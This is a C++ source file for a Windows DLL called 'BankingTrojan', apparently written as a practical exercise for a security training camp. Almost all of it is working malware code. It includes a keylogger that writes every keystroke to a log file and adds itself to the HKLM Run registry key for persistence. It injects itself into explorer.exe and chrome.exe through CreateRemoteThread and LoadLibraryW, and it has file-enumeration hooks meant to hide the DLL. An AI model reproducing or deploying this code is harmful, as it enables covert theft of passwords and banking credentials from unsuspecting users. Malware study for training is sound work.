/*
	BankingTrojan
	Author:Dinlon5566
	Email:  admin@dinlon5566.com

	This project is for "TeamT5 Security Camp 2025 實作題目" only.
*/

#include "pch.h"
#include "Windows.h"
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>    // GetModuleBaseNameW function
#include <processthreadsapi.h>
#include <wchar.h>
#include <fstream>
#include <string>
#include <map>
#include <mutex>


#define DEBUG 1

const wchar_t dllName[] = L"BankingTrojan.dll";
const wchar_t targetProcessName[] = L"chrome.exe";
const std::string string_dllName = "BankingTrojan.dll";

bool getDLLPath(wchar_t*);

/*
	Logger
*/


class Logger {
public:
	static Logger& getInstance() {
		static Logger instance;
		return instance;
	}

	bool initialize(const wchar_t* dllPath) {
		std::wstring path(dllPath);
		size_t pos = path.find_last_of(L"\\/");
		if (pos == std::wstring::npos) {
			return false; 
		}
		directory = path.substr(0, pos + 1);
		//MessageBoxW(NULL, directory.c_str(), L"initializeLogger", MB_OK);
		return true;
	}


	bool setLogFile(const std::wstring& logName) {
		std::lock_guard<std::mutex> lock(mtx);

		if (logFiles.find(logName) == logFiles.end()) {
			std::wstring fullPath = directory + logName;
			std::wofstream* ofs = new std::wofstream(fullPath, std::ios::app);
			if (!ofs->is_open()) {
				// open stream fail
				delete ofs;
				return false; 
			}
			logFiles[logName] = ofs;
		}
		return true;
	}


	void log(const std::wstring& logName, const std::wstring& message,bool changeline=0) {
		std::lock_guard<std::mutex> lock(mtx);
		auto it = logFiles.find(logName);
		if (it != logFiles.end() && changeline ) {
			if (changeline)
			{
				*(it->second) << message << std::endl;
			}
			else
			{
				*(it->second) << message;
			}
		}
	}

	void closeAll() {
		std::lock_guard<std::mutex> lock(mtx);
		for (auto& pair : logFiles) {
			if (pair.second->is_open()) {
				pair.second->close();
			}
			delete pair.second;
		}
		logFiles.clear();
	}

private:
	Logger() {}
	~Logger() { closeAll(); }

	Logger(const Logger&) = delete;
	Logger& operator=(const Logger&) = delete;

	std::wstring directory; // file directory
	std::map<std::wstring, std::wofstream*> logFiles;
	std::mutex mtx;
};

void initializeLogger() {
	wchar_t dllPath[MAX_PATH];
	if (getDLLPath(dllPath)) {
		if (!Logger::getInstance().initialize(dllPath)) {
			if(DEBUG)
				MessageBoxW(NULL, L"Fail to initialize Logger", L"initializeLogger", MB_OK);
		}
	}
	else {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"initializeLogger", MB_OK);
	}
}

void logKeylogger(const std::wstring& message) {
	Logger::getInstance().setLogFile(L"gKeylogger.log");
	Logger::getInstance().log(L"gKeylogger.log", message);
}

void logBankingTrojanKeylogger(const std::wstring& message) {
	Logger::getInstance().setLogFile(L"BankingTrojanKeylogger.txt");
	Logger::getInstance().log(L"BankingTrojanKeylogger.txt", message);
}


/*
	Common functions
*/

// Check if the current user is an administrator
bool isUserAdmin() {	// from MDMZ_Book.pdf
	bool isElevated = false;
	HANDLE token;
	TOKEN_ELEVATION elev;
	DWORD size;
	if (OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY, &token)) {
		if (GetTokenInformation(token, TokenElevation,
			&elev, sizeof(elev), &size)) {
			isElevated = elev.TokenIsElevated;
		}
	}
	if (token) {
		CloseHandle(token);
		token = NULL;
	}
	return isElevated;
}


bool getDLLPath(wchar_t* DLLPath) {
	HMODULE hModule = NULL;
	if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&getDLLPath, &hModule))
	{
		if (GetModuleFileName(hModule, DLLPath, MAX_PATH) > 0)
		{
			return true;
		}
	}
	return false;
}


// Do noting
void debug_hold() {
	while (true) {
		Sleep(1000);
	}
}


/*
	System functions
*/

bool writeRegedit(const wchar_t* dllPath) {
	// start command:
	// rundll32 "C:\dev\BankingTrojan\x64\Debug\BankingTrojan.dll", StartBankingTrojan
	// rundll32 BankingTrojan.dll, StartBankingTrojan
	const wchar_t* valueName = L"BankingTrojan";
	const wchar_t* regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//const wchar_t* regValue = L"C:\\Windows\\System32\\rundll32.exe \"C:\\dev\\BankingTrojan\\x64\\Debug\\BankingTrojan.dll\", StartBankingTrojan";
	std::wstring regLValue = L"C:\\Windows\\System32\\rundll32.exe \"" + std::wstring(dllPath) + L"\", StartBankingTrojan";
	const wchar_t* regValue = regLValue.c_str();


	HKEY hKey;
	LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey);
	if (result != ERROR_SUCCESS)
	{
		return false;
	}

	result = RegSetValueExW(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(regValue), (wcslen(regValue) + 1) * sizeof(wchar_t));
	if (result != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return false;
	}

	RegCloseKey(hKey);
	return true;
}

bool IsProcessRunning(const wchar_t* processName, DWORD* PID = 0)
{
	bool exists = false;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W pe;
		pe.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(hSnapshot, &pe))
		{
			do
			{
				if (_wcsicmp(pe.szExeFile, processName) == 0)
				{
					exists = true;
					*PID = pe.th32ProcessID;
					break;
				}
			} while (Process32NextW(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}
	return exists;
}

/*
	Loder functions
*/

bool DLLinject(DWORD pid, const wchar_t* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		//CloseHandle(hProcess); //  0
		return false;
	}

	LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
	if (pDllPath == NULL)
	{
		CloseHandle(hProcess);
		return false;
	}

	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), &bytesWritten))
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	if (hKernel32 == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	LPTHREAD_START_ROUTINE pLoadLibraryW = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryW"));
	if (pLoadLibraryW == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pDllPath, 0, NULL);
	if (hThread == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}


bool TrojanLoader(const wchar_t* dllPath) {
	// Wait for the target process to start

	// First injection to explorer.exe,then inject to chrome.exe

	// explorer.exe
	DWORD targetPID = 0;
	const DWORD waitInterval = 1000;

	//explorer.exe
	wchar_t exploreName[] = L"explorer.exe";
	while (!IsProcessRunning(exploreName, &targetPID))
	{
		Sleep(waitInterval);
	}
	DLLinject(targetPID, dllPath);

	// chrome.exe
	targetPID = 0;
	while (!IsProcessRunning(targetProcessName, &targetPID))
	{
		Sleep(waitInterval);
	}

	// Inject the DLL into the target process
	DLLinject(targetPID, dllPath);
	return true;
}

/*
	Explorer functions	
	hook the  FindFirstFileW & FindNextFileW，and drop dllName

	TODO

*/
typedef HANDLE(WINAPI* FindFirstFileW_t)(LPCWSTR, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI* FindNextFileW_t)(HANDLE, LPWIN32_FIND_DATAW);

FindFirstFileW_t OriginalFindFirstFileW = NULL;
FindNextFileW_t OriginalFindNextFileW = NULL;

HANDLE WINAPI HookedFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
{
	HANDLE hFind = OriginalFindFirstFileW(lpFileName, lpFindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		if (_wcsicmp(lpFindFileData->cFileName, dllName) == 0)
		{
			return OriginalFindFirstFileW(L"*", lpFindFileData);
			if(DEBUG)
				MessageBoxW(NULL, L"Find!", L"HookedFindFirstFileW", MB_OK);
		}
	}
	return hFind;
}

BOOL WINAPI HookedFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	BOOL result;
	while ((result = OriginalFindNextFileW(hFindFile, lpFindFileData)) != 0)
	{
		if (_wcsicmp(lpFindFileData->cFileName, dllName) != 0)
		{
			return result;
		}
	}
	return result;
}


bool explorerMain( ) {
	wchar_t DLLPath[MAX_PATH];
	if (!getDLLPath(DLLPath)) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"ExplorerMain", MB_OK);



		return 0;
	}

	//SetFileAttributesW(DLLPath, FILE_ATTRIBUTE_HIDDEN);
	if(DEBUG) 
		MessageBoxW(NULL, L"Success run to explorer.exe to END", L"ExplorerMain", MB_OK);
	//HookIAT(GetModuleHandleW(NULL));
	return 1;
}

DWORD WINAPI ExplorerMainThread(LPVOID lpParam)
{
	explorerMain();
	return 0;
}


/*
	Chrome functions
*/

int chromeMain() {

	if(DEBUG)
		MessageBoxW(NULL, L"Success run to Chrome", L"ChromeMainThread", MB_OK);



	debug_hold();
	return 1;
}

DWORD WINAPI ChromeMainThread(LPVOID lpParam)
{
	chromeMain();
	return 0;
}

/*
	Key logger functions
*/

int keyLoggerMain() {

	logBankingTrojanKeylogger(L"KeyLoggerStart!\n");
	char key;
	while (true) {
		Sleep(10);
		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				switch (key)
				{
				case VK_SHIFT:
					logBankingTrojanKeylogger(L"[SHIFT]");
					break;
				case VK_BACK:
					logBankingTrojanKeylogger(L"[BACKSPACE]");
					break;
				case VK_LBUTTON:
					logBankingTrojanKeylogger(L"[LBUTTON]");
					break;
				case VK_RBUTTON:
					logBankingTrojanKeylogger(L"[RBUTTON]");
					break;
				case VK_RETURN:
					logBankingTrojanKeylogger(L"[ENTER]");
					break;
				case VK_TAB:
					logBankingTrojanKeylogger(L"[TAB]");
					break;
				case VK_ESCAPE:
					logBankingTrojanKeylogger(L"[ESCAPE]");
					break;
				case VK_CONTROL:
					logBankingTrojanKeylogger(L"[Ctrl]");
					break;
				case VK_MENU:
					logBankingTrojanKeylogger(L"[Alt]");
					break;
				case VK_CAPITAL:
					logBankingTrojanKeylogger(L"[CAPS Lock]");
					break;
				case VK_SPACE:
					logBankingTrojanKeylogger(L"[SPACE]");
					break;
				}
				if (key == VK_SHIFT || key == VK_BACK || key == VK_LBUTTON || key == VK_RBUTTON || key == VK_RETURN || key == VK_TAB || key == VK_ESCAPE || key == VK_CONTROL || key == VK_MENU || key == VK_CAPITAL || key == VK_SPACE) {
					continue;
				}
				else {
					logBankingTrojanKeylogger(std::wstring(1, key).c_str());
				}
			}
		}
	}
	if (DEBUG)
		MessageBoxW(NULL, L"Success run to KeyLogger to END", L"KeyLoggerMainThread", MB_OK);
	return 1;
}

DWORD WINAPI KeyLoggerMainThread(LPVOID lpParam)
{
	keyLoggerMain();
	return 0;
}

/*
	RunDLL32 Entry point
*/
extern "C" __declspec(dllexport) void CALLBACK StartBankingTrojan(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	wchar_t dllPath[MAX_PATH];

	if ( !getDLLPath(dllPath)) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"StartBankingTrojan", MB_OK);
		ExitProcess(-1);
	}

	// Register key first
	if (isUserAdmin()) {
		writeRegedit(dllPath);
	}
	else if(DEBUG){
		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"BankingTrojan", MB_OK);
	}

	//keylogger thread
	DWORD KeyloggerThreadId = 0;
	HANDLE hKeyloggerThread = CreateThread(
		NULL,
		0,
		KeyLoggerMainThread,
		NULL,
		0,
		&KeyloggerThreadId
	);
	TrojanLoader(dllPath);

	// Wait for the keylogger thread to finish
	WaitForSingleObject(hKeyloggerThread, INFINITE);
	CloseHandle(hKeyloggerThread);


	ExitProcess(0);
}

/*
	DLL Entry point
		RunDLL32 => $NULL
		Chrome => ChromeMainThread
		Explorer => ExplorerMainThread
*/
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	HANDLE hProcess = GetCurrentProcess();
	wchar_t processName[MAX_PATH] = L"<unknown>";
	wchar_t exploreName[] = L"explorer.exe";
	HANDLE hThread = NULL;
	DWORD threadId = 0;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		initializeLogger();

		HANDLE hProcess = GetCurrentProcess();

		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
		{
			if (_wcsicmp(processName, targetProcessName) == 0) {
				// New thread for chromeMain
				hThread = CreateThread(
					NULL,
					0,
					ChromeMainThread,
					NULL,
					0,
					&threadId
				);

				if (hThread == NULL) {
					// fail to create thread
				}
			}
			else if (_wcsicmp(processName, exploreName)==0) {
				// New thread for explorerMain
				hThread = CreateThread(
					NULL,
					0,
					ExplorerMainThread,
					NULL,
					0,
					&threadId
				);

				if (hThread == NULL) {
					// fail to create thread
				}
			}
			else if (_wcsicmp(processName, exploreName) == 0)
			{
				// todo
			}
		}
	}

	break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		Logger::getInstance().closeAll();

		if (hThread != NULL) {
			// Terminate thread( Wait DETACH)
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			hThread = NULL;
		}
	}
	break;
	}
	return TRUE;
}

